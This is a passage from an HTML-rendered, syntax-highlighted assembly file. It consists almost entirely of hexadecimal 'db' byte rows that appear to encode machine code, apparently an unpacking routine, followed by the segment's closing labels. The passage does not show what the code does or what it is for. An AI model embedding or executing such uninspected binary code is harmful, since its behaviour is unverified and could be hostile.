                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">061h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C7h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">050h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">072h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">060h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">048h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">08Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00Ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">096h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03Ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E8h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">002h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">066h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">058h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">084h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0B0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">045h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0B4h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">007h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">05Ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0EAh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E9h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">044h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">060h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E8h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">093h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0A0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">09Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">073h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">048h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">050h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C6h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0F0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">041h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0D3h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">060h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">040h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0D1h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0EDh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FEh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0CAh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">075h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">005h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ADh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">08Bh</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0E8h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0B2h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">010h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C3h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E8h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F1h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0D0h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0D7h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E8h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ECh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">072h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">014h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0B6h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">002h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0B1h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E8h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E3h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">072h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">009h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E8h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0DEh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0D0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0D7h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0D0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E6h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E2h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F2h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">02Ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FEh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0B6h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0B1h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">004h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FEh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C6h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0E8h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0CDh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">072h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">010h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E2h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F7h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E8h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0C6h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">073h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FEh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C6h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E8h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0BFh</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0FFh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">073h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FEh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C6h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">08Ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0CEh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0EBh</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">02Ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E8h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0B4h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">072h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">010h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0B1h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">003h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0B6h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E8h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ABh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0D0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0D6h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E2h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0F9h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">080h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C6h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">009h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0EBh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E7h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ACh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">08Ah</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0C8h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">083h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C1h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">011h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0EBh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0B1h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">003h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0E8h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">095h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0D0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0D7h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E2h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F9h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FEh</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0CFh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0B1h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">026h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">08Ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0AAh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E2h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0FAh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E8h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">084h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">073h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0A4h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0EBh</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0F8h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E8h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">07Ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ACh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0B7h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">08Ah</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0D8h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">072h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">081h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E8h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">072h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">072h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0D6h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">03Ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FBh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">075h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DDh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">033h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0EDh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">033h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">033h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F6h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">033h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0D2h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">033h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DBh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">033h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0E9h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">07Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0EBh</span><span class="sc0">
                
</span><span class="sc5">last</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">_TEXT</span><span class="sc0">           </span><span class="sc9">ends</span><span class="sc0">
                </span><span class="sc9">end</span><span class="sc0">    </span><span class="sc5">first</span><span class="sc0">
</span></div></body>
</html>
